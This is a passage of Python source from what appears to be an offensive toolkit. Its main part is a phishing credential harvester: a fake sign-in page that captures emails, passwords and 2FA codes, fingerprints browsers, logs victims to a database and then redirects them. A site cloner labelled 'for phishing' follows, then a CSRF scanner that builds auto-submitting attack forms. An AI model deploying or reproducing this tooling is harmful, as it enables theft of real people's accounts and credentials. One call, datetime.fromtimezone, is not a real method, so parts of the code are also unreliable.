        @media (max-width: 480px) {{
            .container {{
                padding: 30px 20px;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">{logo}</div>
        <h1>Sign in to {service_name}</h1>
        <p class="subtitle">Enter your credentials to continue</p>
        
        <form method="POST" action="/" id="loginForm">
            '''
                
                # Add fields based on template
                if 'email' in fields:
                    html += '''
            <div class="form-group">
                <label for="email">Email address</label>
                <input type="email" id="email" name="email" required 
                       placeholder="Enter your email" autocomplete="email">
            </div>
            '''
                
                if 'username' in fields and 'email' not in fields:
                    html += '''
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required 
                       placeholder="Enter your username" autocomplete="username">
            </div>
            '''
                
                html += '''
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required 
                       placeholder="Enter your password" autocomplete="current-password">
            </div>
            '''
                
                if '2fa' in fields:
                    html += '''
            <div class="form-group">
                <label for="code">Verification Code (if enabled)</label>
                <input type="text" id="code" name="code" 
                       placeholder="Enter 6-digit code" maxlength="6" autocomplete="one-time-code">
            </div>
            '''
                
                html += f'''
            <button type="submit" class="button">Sign In</button>
            
            <div class="options">
                <a href="#">Forgot password?</a> • <a href="#">Create account</a>
            </div>
            
            <div class="security-notice">
                 Your connection is secure and encrypted
            </div>
        </form>
    </div>
    
    <script>
        // Browser fingerprinting
        const fingerprint = {{
            screen: window.screen.width + 'x' + window.screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        }};
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            // Add fingerprint data
            const fpInput = document.createElement('input');
            fpInput.type = 'hidden';
            fpInput.name = 'fingerprint';
            fpInput.value = JSON.stringify(fingerprint);
            this.appendChild(fpInput);
        }});
    </script>
</body>
</html>'''
                
                return html
            
            def _process_capture(self, credentials):
                """Process captured credentials"""
                try:
                    # Extract IP and geolocation
                    ip_addr = self.client_address[0]
                    country = self._get_country_from_ip(ip_addr) if self.profile['capture_ip'] else 'Unknown'
                    
                    # Parse User-Agent
                    user_agent = self.headers.get('User-Agent', 'Unknown')
                    browser, os_info = self._parse_user_agent(user_agent) if self.profile['capture_useragent'] else ('Unknown', 'Unknown')
                    
                    # Get session
                    session_id = self._get_session_from_cookie()
                    
                    # Build capture object
                    capture = {
                        'timestamp': int(time.time()),
                        'template': self.profile['template'],
                        'ip_address': ip_addr,
                        'country': country,
                        'user_agent': user_agent,
                        'browser': browser,
                        'os': os_info,
                        'session_id': session_id,
                        'referrer': self.headers.get('Referer', 'Direct'),
                        'credentials': {}
                    }
                    
                    # Extract credentials
                    for key, values in credentials.items():
                        if key == 'fingerprint':
                            try:
                                capture['fingerprint'] = json.loads(values[0])
                            except:
                                pass
                        elif values:
                            capture['credentials'][key] = values[0]
                    
                    return capture
                    
                except Exception as e:
                    logging.error(f"Capture processing error: {str(e)}")
                    return None
            
            def _get_country_from_ip(self, ip):
                """Get country from IP (simplified - in production use MaxMind GeoIP)"""
                # Placeholder - would use actual GeoIP library
                if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
                    return 'Private Network'
                return 'Unknown'
            
            def _parse_user_agent(self, ua):
                """Parse User-Agent string"""
                browser = 'Unknown'
                os_info = 'Unknown'
                
                # Browser detection
                if 'Chrome' in ua and 'Edg' not in ua:
                    browser = 'Chrome'
                elif 'Firefox' in ua:
                    browser = 'Firefox'
                elif 'Safari' in ua and 'Chrome' not in ua:
                    browser = 'Safari'
                elif 'Edg' in ua:
                    browser = 'Edge'
                elif 'MSIE' in ua or 'Trident' in ua:
                    browser = 'Internet Explorer'
                
                # OS detection
                if 'Windows NT 10' in ua:
                    os_info = 'Windows 10/11'
                elif 'Windows NT 6' in ua:
                    os_info = 'Windows 7/8'
                elif 'Mac OS X' in ua:
                    os_info = 'macOS'
                elif 'Linux' in ua:
                    os_info = 'Linux'
                elif 'Android' in ua:
                    os_info = 'Android'
                elif 'iOS' in ua or 'iPhone' in ua or 'iPad' in ua:
                    os_info = 'iOS'
                
                return browser, os_info
            
            def _get_session_from_cookie(self):
                """Extract session ID from cookie"""
                cookie_header = self.headers.get('Cookie', '')
                if 'session_id=' in cookie_header:
                    for part in cookie_header.split(';'):
                        if 'session_id=' in part:
                            return part.split('=')[1].strip()
                return 'unknown'
            
            def _display_capture(self, capture):
                """Display captured credentials"""
                print(f"\n{Fore.GREEN}{'═' * 70}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[] CREDENTIALS CAPTURED!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}{'═' * 70}{Style.RESET_ALL}")
                
                print(f"{Fore.CYAN}[] IP Address:{Style.RESET_ALL} {capture['ip_address']} ({capture['country']})")
                print(f"{Fore.CYAN}[] Browser:{Style.RESET_ALL} {capture['browser']} on {capture['os']}")
                print(f"{Fore.CYAN}[] Session:{Style.RESET_ALL} {capture['session_id'][:16]}...")
                print(f"{Fore.CYAN}[] Time:{Style.RESET_ALL} {datetime.fromtimezone(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}")
                
                print(f"\n{Fore.YELLOW}[] Captured Data:{Style.RESET_ALL}")
                for key, value in capture['credentials'].items():
                    if key == 'password':
                        masked = '*' * len(value)
                        print(f" {Fore.WHITE}{key:12s}:{Style.RESET_ALL} {masked} {Fore.GREEN}(Length: {len(value)}){Style.RESET_ALL}")
                    else:
                        print(f" {Fore.WHITE}{key:12s}:{Style.RESET_ALL} {value}")
                
                print(f"{Fore.GREEN}{'═' * 70}{Style.RESET_ALL}\n")
                
                # Update statistics
                self.harvester['stats']['by_country'][capture['country']] = \
                    self.harvester['stats']['by_country'].get(capture['country'], 0) + 1
                self.harvester['stats']['by_browser'][capture['browser']] = \
                    self.harvester['stats']['by_browser'].get(capture['browser'], 0) + 1
            
            def _store_capture(self, capture):
                """Store capture in database"""
                try:
                    import sqlite3
                    conn = sqlite3.connect(self.profile['db_file'])
                    cursor = conn.cursor()
                    
                    cursor.execute('''
                        INSERT INTO captures 
                        (timestamp, template, username, password, email, code_2fa, 
                         ip_address, country, user_agent, browser, os, session_id, referrer)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        capture['timestamp'],
                        capture['template'],
                        capture['credentials'].get('username', ''),
                        capture['credentials'].get('password', ''),
                        capture['credentials'].get('email', ''),
                        capture['credentials'].get('code', ''),
                        capture['ip_address'],
                        capture['country'],
                        capture['user_agent'],
                        capture['browser'],
                        capture['os'],
                        capture['session_id'],
                        capture['referrer']
                    ))
                    
                    conn.commit()
                    conn.close()
                    
                except Exception as e:
                    logging.error(f"Database storage error: {str(e)}")
            
            def _send_email_notification(self, capture):
                """Send email notification (placeholder)"""
                # In production, would use SMTP
                logging.info(f"Email notification would be sent to: {self.profile['email_to']}")
            
            def _send_redirect_response(self):
                """Send redirect response"""
                redirect_url = self.profile['redirect_url']
                delay = self.profile['delay_redirect']
                
                if self.profile['auto_redirect']:
                    # JavaScript redirect with delay
                    html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f5f5f5;
        }}
        .message {{
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .spinner {{
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
    <meta http-equiv="refresh" content="{delay};url={redirect_url}">
</head>
<body>
    <div class="message">
        <div class="spinner"></div>
        <h2>Verifying credentials...</h2>
        <p>Please wait while we redirect you.</p>
    </div>
</body>
</html>'''
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.send_header('Content-Length', len(html.encode()))
                    self.end_headers()
                    self.wfile.write(html.encode())
                else:
                    # Direct redirect
                    self.send_response(302)
                    self.send_header('Location', redirect_url)
                    self.end_headers()
        
        # Create handler with closures
        def handler_factory(*args, **kwargs):
            # Store templates in profile for access by handler
            profile['_templates'] = self._get_available_templates()
            return CredentialHarvestHandler(*args, harvester_instance=harvester, profile_config=profile, **kwargs)
        
        # Start server
        try:
            server_address = ('', profile['port'])
            httpd = HTTPServer(server_address, handler_factory)
            
            print(f"{Fore.GREEN}[] Server started successfully!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Listening on {profile['lhost']}:{profile['port']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop the server{Style.RESET_ALL}\n")
            print(f"{Fore.WHITE}{'═' * 70}{Style.RESET_ALL}\n")
            print(f"{Fore.CYAN}[] Waiting for victims...{Style.RESET_ALL}\n")
            
            # Serve forever
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                print(f"\n\n{Fore.YELLOW}[*] Shutting down server...{Style.RESET_ALL}")
                httpd.shutdown()
                
                # Display final statistics
                self._display_harvester_statistics(harvester)
                
                print(f"{Fore.GREEN}[] Server stopped{Style.RESET_ALL}")
                
        except OSError as e:
            if 'Address already in use' in str(e):
                print(f"{Fore.RED}[] Port {profile['port']} is already in use{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Try a different port with: set port <number>{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[] Server error: {str(e)}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[] Fatal error: {str(e)}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
    
    def _display_harvester_statistics(self, harvester):
        """Display final statistics"""
        stats = harvester['stats']
        runtime = time.time() - harvester['start_time']
        
        print(f"\n{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[] FINAL STATISTICS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}[️] Runtime:{Style.RESET_ALL} {int(runtime // 60)}m {int(runtime % 60)}s")
        print(f"{Fore.YELLOW}[] Total Visits:{Style.RESET_ALL} {stats['total_visits']}")
        print(f"{Fore.YELLOW}[] Credentials Captured:{Style.RESET_ALL} {stats['total_captures']}")
        print(f"{Fore.YELLOW}[] Unique IPs:{Style.RESET_ALL} {len(stats['unique_ips'])}")
        
        if stats['by_country']:
            print(f"\n{Fore.CYAN}[] By Country:{Style.RESET_ALL}")
            for country, count in sorted(stats['by_country'].items(), key=lambda x: x[1], reverse=True)[:5]:
                print(f" {country:20s}: {count}")
        
        if stats['by_browser']:
            print(f"\n{Fore.CYAN}[] By Browser:{Style.RESET_ALL}")
            for browser, count in sorted(stats['by_browser'].items(), key=lambda x: x[1], reverse=True)[:5]:
                print(f" {browser:20s}: {count}")
        
        print(f"\n{Fore.GREEN}[] Data saved to: {harvester['profile']['db_file']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}\n")
    
    def run_website_cloner(self):
        """Website cloner for phishing"""
        url = self.module_options.get('url', 'https://facebook.com')
        output_dir = self.module_options.get('output', 'phish_site')
        
        print(f"{Fore.CYAN}[*] Cloning website{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Target: {url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Output: {output_dir}{Style.RESET_ALL}\n")
        
        try:
            # Create output directory
            os.makedirs(output_dir, exist_ok=True)
            
            # Download page
            print(f"{Fore.BLUE}[*] Downloading page...{Style.RESET_ALL}")
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                # Save HTML
                html_file = os.path.join(output_dir, 'index.html')
                with open(html_file, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                
                print(f"{Fore.GREEN}[+] Page cloned successfully{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Saved to: {html_file}{Style.RESET_ALL}")
                print(f"\n{Fore.YELLOW}[*] Modify forms to send credentials to your harvester{Style.RESET_ALL}")
                print(f"{Fore.BLUE}[*] Host with: python3 -m http.server 8080 --directory {output_dir}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] Failed to download page: {response.status_code}{Style.RESET_ALL}")
        
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    # ============ ADDITIONAL MODULES ============
    
    def run_csrf_scanner(self):
        """Adaptive CSRF protection analyzer"""
        if not BS4_AVAILABLE:
            print(f"{Fore.RED}[!] BeautifulSoup not available. Install with: pip install beautifulsoup4{Style.RESET_ALL}")
            return
        opts = self._resolve_csrf_options()
        print(f"{Fore.CYAN}╔{'═'*70}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{' '*19}ADAPTIVE CSRF ANALYZER - KNDYS v3.0{' '*18}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}[*] Target: {opts['url']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Mode: {opts['mode'].upper()} | Scope: {opts['scope']} | Method Filter: {opts['method_label']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Crawl depth: {opts['crawl_depth']} | Pages max: {opts['max_pages']} | Forms max: {opts['form_limit']}{Style.RESET_ALL}")
        if opts['rate_limiter']:
            print(f"{Fore.CYAN}[*] Rate limit: {opts['rate_limiter'].max_requests}/s{Style.RESET_ALL}")
        print()

        discovery = self._crawl_csrf_surface(opts)
        forms = discovery['forms']
        if not forms:
            print(f"{Fore.YELLOW}[!] No HTML forms discovered within scope{Style.RESET_ALL}")
            if discovery['errors']:
                print(f"{Fore.YELLOW} Errors observed: {len(discovery['errors'])}{Style.RESET_ALL}")
            return

        analysis = self._analyze_csrf_forms(forms, opts)
        token_verification = self._verify_token_rotation(forms, opts) if opts['verify_tokens'] else []
        cookie_findings = self._evaluate_cookie_policies(discovery['set_cookie_headers'], opts)
        referrer_findings = self._evaluate_referrer_policies(discovery['referrer_policies'], opts)

        summary = self._build_csrf_summary(opts, discovery, analysis, token_verification, cookie_findings, referrer_findings)
        self._render_csrf_console(summary)
        self._export_csrf_results(summary)

    def _resolve_csrf_options(self):
        raw = self.module_options
        url = raw.get('url', '')
        if not url:
            print(f"{Fore.RED}[!] No target URL provided. Use 'set url <target>'{Style.RESET_ALL}")
            return None
        
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
        except Exception:
            print(f"{Fore.RED}[!] Invalid URL format{Style.RESET_ALL}")
            return None
        
        mode = (raw.get('mode', 'balanced') or 'balanced').lower()
        profile = self._get_csrf_profile(mode)
        scope = (raw.get('scope', 'single') or 'single').lower()
        if scope not in {'single', 'host', 'crawl'}:
            scope = 'single'
        method_opt = (raw.get('method_filter', raw.get('forms', 'all')) or 'all').lower()
        if method_opt == 'post':
            method_filter = {'POST'}
            method_label = 'POST'
        elif method_opt == 'get':
            method_filter = {'GET'}
            method_label = 'GET'
        else:
            method_filter = {'GET', 'POST'}
            method_label = 'ALL'
        crawl_depth = self._safe_int(raw.get('crawl_depth'), profile['crawl_depth'], 0, 5)
        max_pages = self._safe_int(raw.get('max_pages'), profile['max_pages'], 1, 60)
        form_limit = self._safe_int(raw.get('form_limit'), profile['form_limit'], 1, 200)
        threads = self._safe_int(raw.get('threads'), profile['threads'], 1, 32)
        timeout = self._safe_float(raw.get('timeout'), profile['timeout'], 2.0, 30.0)
        include_get_forms = self._parse_bool_option(raw.get('include_get_forms', 'false'), False)
        check_samesite = self._parse_bool_option(raw.get('check_samesite', 'true'), True)
        check_referer = self._parse_bool_option(raw.get('check_referer', 'true'), True)
        verify_tokens = self._parse_bool_option(raw.get('verify_tokens', 'true'), True)
        generate_poc = self._parse_bool_option(raw.get('generate_poc', 'true'), True)
        sensitive_keywords = [kw.strip().lower() for kw in (raw.get('sensitive_keywords') or '').split(',') if kw.strip()]
        custom_headers = self._build_header_map(raw.get('custom_headers', ''))
        cookies = self._build_cookie_map(raw.get('cookies', ''))
        headers = {
            'User-Agent': self.config.get('user_agent', 'KNDYS-CSRF'),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        headers.update(custom_headers)
        try:
            rate_value = float(raw.get('rate_limit', '0') or 0)
        except (TypeError, ValueError):
            rate_value = 0.0
        
        # Create rate limiter if needed
        rate_limiter = None
        if rate_value > 0:
            try:
                rate_limiter = type('RateLimiter', (), {'max_requests': rate_value})()
            except Exception:
                pass
        
        base_host = parsed.netloc.lower()
        opts = {
            'url': url,
            'mode': mode,
            'scope': scope,
            'crawl_depth': crawl_depth,
            'max_pages': max_pages,
            'form_limit': form_limit,
            'method_filter': method_filter,
            'method_label': method_label,
            'threads': threads,
            'timeout': timeout,
            'include_get_forms': include_get_forms,
            'check_samesite': check_samesite,
            'check_referer': check_referer,
            'verify_tokens': verify_tokens,
            'generate_poc': generate_poc,
            'sensitive_keywords': sensitive_keywords,
            'headers': headers,
            'custom_headers': custom_headers,
            'cookies': cookies,
            'rate_limiter': rate_limiter,
            'base_host': base_host,
            'profile': profile
        }
        return opts

    def _get_csrf_profile(self, mode):
        profiles = {
            'fast': {
                'crawl_depth': 1,
                'max_pages': 6,
                'form_limit': 20,
                'threads': 6,
                'timeout': 6.0,
                'token_verify_limit': 1
            },
            'balanced': {
                'crawl_depth': 2,
                'max_pages': 12,
                'form_limit': 40,
                'threads': 8,
                'timeout': 8.0,
                'token_verify_limit': 2
            },
            'deep': {
                'crawl_depth': 3,
                'max_pages': 25,
                'form_limit': 80,
                'threads': 12,
                'timeout': 12.0,
                'token_verify_limit': 4
            }
        }
        return profiles.get(mode, profiles['balanced'])

    def _crawl_csrf_surface(self, opts):
        queue_items = deque([(opts['url'], 0)])
        visited = set()
        forms = []
        errors = []
        set_cookie_headers = []
        referrer_policies = []
        meta_tokens = []
        js_hints = []
        pages = 0
        while queue_items and pages < opts['max_pages'] and len(forms) < opts['form_limit']:
            current, depth = queue_items.popleft()
            normalized = self._normalize_crawl_url(current)
            if normalized in visited:
                continue
            visited.add(normalized)
            if opts['rate_limiter']:
                opts['rate_limiter'].wait_if_needed()
            try:
                response = requests.get(current, headers=opts['headers'], cookies=opts['cookies'], timeout=opts['timeout'], verify=False, allow_redirects=True)
            except Exception as exc:
                errors.append(f"{current}: {exc}")
                continue
            pages += 1
            final_url = response.url or current
            content_type = response.headers.get('Content-Type', '').lower()
            html_text = response.text if ('html' in content_type or not content_type) else ''
            if 'set-cookie' in response.headers:
                set_cookie_headers.append(response.headers.get('set-cookie'))
            if 'referrer-policy' in response.headers:
                referrer_policies.append(response.headers.get('referrer-policy'))
            page_forms, page_meta, page_js_hints = self._parse_forms_from_html(html_text, final_url, opts)
            for form in page_forms:
                form['sequence'] = len(forms) + 1
                forms.append(form)
                if len(forms) >= opts['form_limit']:
                    break
            meta_tokens.extend(page_meta)
            js_hints.extend(page_js_hints)
            if opts['scope'] != 'single' and depth < opts['crawl_depth']:
                links = self._extract_links_from_html(html_text, final_url)
                for link in links:
                    if self._should_follow_link(opts['base_host'], link, opts['scope']):
                        queue_items.append((link, depth + 1))
        stats = {
            'pages': pages,
            'forms': len(forms),
            'errors': len(errors)
        }
        return {
            'forms': forms,
            'stats': stats,
            'errors': errors,
            'set_cookie_headers': set_cookie_headers,
            'referrer_policies': referrer_policies,
            'meta_tokens': meta_tokens,
            'js_hints': js_hints
        }

    def _parse_forms_from_html(self, html_text, page_url, opts):
        if not html_text:
            return [], [], []
        soup = BeautifulSoup(html_text, 'html.parser')
        page_title = ''
        if soup.title and soup.title.string:
            page_title = soup.title.string.strip()
        forms = []
        meta_tokens = []
        js_hints = []
        for meta in soup.find_all('meta'):
            meta_name = (meta.get('name') or meta.get('id') or '').lower()
            if any(token in meta_name for token in ['csrf', 'token', 'xsrf']):
                meta_tokens.append({'name': meta.get('name') or meta.get('id') or 'meta', 'content': meta.get('content', ''), 'url': page_url})
        for script in soup.find_all('script'):
            script_text = script.string or ''
            if script_text and 'csrf' in script_text.lower():
                js_hints.append({'url': page_url, 'snippet': script_text[:200]})
        forms_found = soup.find_all('form')
        for idx, form in enumerate(forms_found, 1):
            method = form.get('method', 'get').upper()
            if method not in opts['method_filter']:
                continue
            action = form.get('action') or page_url
            action = urljoin(page_url, action)
            inputs = []
            hidden_inputs = []
            token_fields = []
            token_values = []
            for field in form.find_all(['input', 'textarea', 'select']):
                field_name = field.get('name') or ''
                field_type = field.get('type', 'text').lower()
                value = field.get('value', '')
                if field.name == 'textarea':
                    value = field.text
                    field_type = 'textarea'
                if field.name == 'select':
                    options = field.find_all('option')
                    if options:
                        selected = next((opt for opt in options if opt.has_attr('selected')), options[0])
                        value = selected.get('value', selected.text)
                    field_type = 'select'
                entry = {'name': field_name, 'type': field_type, 'value': value}
                inputs.append(entry)
                if field_type == 'hidden':
                    hidden_inputs.append(entry)
                lname = field_name.lower()
                if any(token in lname for token in ['csrf', 'token', '_token', 'xsrf', 'authenticity']):
                    token_fields.append(field_name)
                    token_values.append(value)
            sensitive = False
            matched_keywords = []
            descriptor = f"{action} {' '.join([inp['name'] for inp in inputs if inp['name']])}"
            for kw in opts['sensitive_keywords']:
                if kw and kw in descriptor.lower():
                    sensitive = True
                    matched_keywords.append(kw)
            form_id = f"{page_url}|{action}|{method}|{idx}"
            token_strength = self._score_token_strength(token_values[0]) if token_values else 'missing'
            forms.append({
                'form_id': form_id,
                'page_url': page_url,
                'page_title': page_title,
                'action': action,
                'method': method,
                'inputs': inputs,
                'hidden_inputs': hidden_inputs,
                'token_fields': token_fields,
                'token_values': token_values,
                'has_token': bool(token_fields),
                'token_strength': token_strength,
                'sensitive': sensitive,
                'keywords': matched_keywords,
                'attributes': {attr: form.get(attr) for attr in ['id', 'class', 'enctype'] if form.get(attr)}
            })
        return forms, meta_tokens, js_hints

    def _score_token_strength(self, token_value):
        if not token_value:
            return 'missing'
        length = len(token_value)
        if length < 8:
            return 'weak'
        entropy = self._estimate_entropy(token_value)
        if entropy < 3.0:
            return 'weak'
        if entropy < 4.0:
            return 'moderate'
        return 'strong'

    def _estimate_entropy(self, value):
        if not value:
            return 0.0
        counts = Counter(value)
        length = len(value)
        entropy = 0.0
        for count in counts.values():
            p = count / length
            entropy -= p * math.log(p, 2)
        return entropy

    def _analyze_csrf_forms(self, forms, opts):
        vulnerabilities = []
        warnings = []
        token_catalog = Counter()
        forms_without_tokens = []
        get_forms = 0
        sensitive_forms = 0
        for form in forms:
            if form['has_token']:
                for token in form['token_values']:
                    if token:
                        token_catalog[token] += 1
            else:
                forms_without_tokens.append(form)
            if form['method'] == 'GET':
                get_forms += 1
            if form['sensitive']:
                sensitive_forms += 1
            if not form['has_token'] and (form['method'] == 'POST' or form['sensitive'] or opts['include_get_forms']):
                detail = 'No anti-CSRF token found in form inputs'
                vuln = self._build_vulnerability_entry(form, 'High', 'Missing CSRF token', detail, opts)
                vulnerabilities.append(vuln)
            elif form['has_token'] and form['token_strength'] == 'weak':
                detail = f"Token '{form['token_fields'][0]}' has low entropy"
                vuln = self._build_vulnerability_entry(form, 'Medium', 'Weak CSRF token quality', detail, opts)
                vulnerabilities.append(vuln)
            if form['method'] == 'GET' and (form['sensitive'] or opts['include_get_forms']):
                detail = 'State-changing action exposed via GET request'
                vuln = self._build_vulnerability_entry(form, 'Medium', 'State-changing GET form', detail, opts)
                vulnerabilities.append(vuln)
        for token_value, count in token_catalog.items():
            if count > 1:
                warnings.append({
                    'category': 'Token Reuse',
                    'detail': f"Token value '{token_value[:12]}...' observed in {count} forms",
                    'remediation': 'Ensure per-request unique tokens'
                })
        return {
            'vulnerabilities': vulnerabilities,
            'warnings': warnings,
            'forms_without_tokens': forms_without_tokens,
            'sensitive_forms': sensitive_forms,
            'get_forms': get_forms,
            'token_catalog': token_catalog,
            'forms': forms
        }

    def _build_vulnerability_entry(self, form, severity, finding, detail, opts):
        entry = {
            'severity': severity,
            'finding': finding,
            'detail': detail,
            'method': form['method'],
            'action': form['action'],
            'page': form['page_url'],
            'token_fields': form['token_fields'],
            'keywords': form['keywords']
        }
        if opts['generate_poc'] and severity in {'High', 'Critical'}:
            entry['poc'] = self._generate_csrf_poc(form)
        return entry

    def _generate_csrf_poc(self, form):
        inputs_html = []
        for inp in form['inputs']:
            if inp['type'] in {'submit', 'button'}:
                continue
            value = inp['value'] or ''
            name = inp['name'] or ''
            if not name:
                continue
            safe_value = html.escape(value)
            inputs_html.append(f" <input type=\"hidden\" name=\"{html.escape(name)}\" value=\"{safe_value}\">")
        inputs_html.append(" <input type=\"submit\" value=\"CSRF PoC\">")
        form_html = ["<html>", "<body>", f" <form action=\"{form['action']}\" method=\"{form['method'].lower()}\" id=\"csrf_poc\" target=\"_blank\">"]
        form_html.extend(inputs_html)
        form_html.append(" </form>")
        form_html.append(" <script>document.getElementById('csrf_poc').submit();</script>")
        form_html.append("</body>")
        form_html.append("</html>")
        return '\n'.join(form_html)

    def _evaluate_cookie_policies(self, cookie_headers, opts):
        findings = []
        if not opts['check_samesite'] or not cookie_headers:
            return findings
        for header in cookie_headers:
            chunks = [header]
            if '\n' in header:
                chunks = [chunk.strip() for chunk in header.split('\n') if chunk.strip()]
            for chunk in chunks:
                lower_chunk = chunk.lower()
                if 'samesite=' not in lower_chunk:
                    name = chunk.split('=', 1)[0].strip()
                    findings.append({
                        'cookie': name,
                        'detail': 'Cookie missing SameSite attribute',
                        'recommendation': 'Set SameSite=strict or lax for session cookies'
                    })
        return findings

    def _evaluate_referrer_policies(self, referrer_policies, opts):
        findings = []
        if not opts['check_referer']:
            return findings
        if not referrer_policies:
            findings.append({
                'detail': 'No Referrer-Policy header observed',
                'recommendation': 'Use Referrer-Policy: same-origin or strict-origin-when-cross-origin'
            })
        return findings

    def _verify_token_rotation(self, forms, opts):
        samples = [form for form in forms if form['has_token']]
        limit = min(opts['profile']['token_verify_limit'], len(samples))
        findings = []
        for form in samples[:limit]:
            if opts['rate_limiter']:
                opts['rate_limiter'].wait_if_needed()
            try:
                response = requests.get(form['page_url'], headers=opts['headers'], cookies=opts['cookies'], timeout=opts['timeout'], verify=False, allow_redirects=True)
            except Exception as exc:
                findings.append({'detail': f"Token re-check failed for {form['page_url']}: {exc}"})
                continue
            content_type = response.headers.get('Content-Type', '').lower()
            html_text = response.text if ('html' in content_type or not content_type) else ''
            new_forms, _, _ = self._parse_forms_from_html(html_text, response.url or form['page_url'], opts)
            matched = self._match_form_signature(form, new_forms)
            if matched and matched['token_values'] and form['token_values']:
                if matched['token_values'][0] == form['token_values'][0]:
                    findings.append({
                        'detail': f"Token for action {form['action']} appears static across requests",
                        'recommendation': 'Rotate token per request/session'
                    })
        return findings

    def _match_form_signature(self, baseline_form, candidate_forms):
        for form in candidate_forms:
            if form['action'] != baseline_form['action']:
                continue
            if form['method'] != baseline_form['method']:
                continue
            if set(form['token_fields']) != set(baseline_form['token_fields']):
                continue
            return form
        return None

    def _build_csrf_summary(self, opts, discovery, analysis, token_verification, cookie_findings, referrer_findings):
        timestamp = int(time.time())
        summary = {
            'target': opts['url'],
            'timestamp': timestamp,
            'mode': opts['mode'],
            'scope': opts['scope'],
            'method_filter': opts['method_label'],
            'stats': discovery['stats'],
            'vulnerabilities': analysis['vulnerabilities'],
            'warnings': analysis['warnings'],
            'token_verification': token_verification,
            'cookie_findings': cookie_findings,
            'referrer_findings': referrer_findings,
            'forms': discovery['forms'],
            'meta_tokens': discovery['meta_tokens'],
            'js_hints': discovery['js_hints']
        }
        return summary

    def _render_csrf_console(self, summary):
        vulns = summary['vulnerabilities']
        warnings = summary['warnings']
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}CSRF ANALYSIS SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Pages analyzed: {summary['stats']['pages']} | Forms analyzed: {summary['stats']['forms']}{Style.RESET_ALL}")
        if vulns:
            print(f"\n{Fore.RED}[!] Confirmed Findings ({len(vulns)}){Style.RESET_ALL}")
            for entry in vulns[:6]:
                print(f" - {entry['severity']} {entry['finding']} @ {entry['action']} ({entry['method']})")
        else:
            print(f"\n{Fore.GREEN}[+] No direct CSRF gaps confirmed in analyzed forms{Style.RESET_ALL}")
        if warnings or summary['cookie_findings'] or summary['referrer_findings']:
            print(f"\n{Fore.YELLOW}[*] Hardening Opportunities{Style.RESET_ALL}")
            for warn in warnings[:5]:
                print(f" - {warn['category']}: {warn['detail']}")
            for cookie_warn in summary['cookie_findings'][:3]:
                print(f" - Cookie: {cookie_warn['detail']}")
            for ref_warn in summary['referrer_findings'][:2]:
                print(f" - Header: {ref_warn['detail']}")
        if summary['token_verification']:
            print(f"\n{Fore.YELLOW}[*] Token Rotation Checks{Style.RESET_ALL}")
            for finding in summary['token_verification']:
                print(f" - {finding['detail']}")

    def _export_csrf_results(self, summary):
        safe_target = re.sub(r'[^a-zA-Z0-9._-]', '_', summary['target'])
        json_file = f"csrf_scan_{safe_target}_{summary['timestamp']}.json"
        with open(json_file, 'w', encoding='utf-8') as fh:
            json.dump(summary, fh, indent=2)
        txt_file = f"csrf_scan_{safe_target}_{summary['timestamp']}_report.txt"
        with open(txt_file, 'w', encoding='utf-8') as fh:
            fh.write("=" * 78 + "\n")
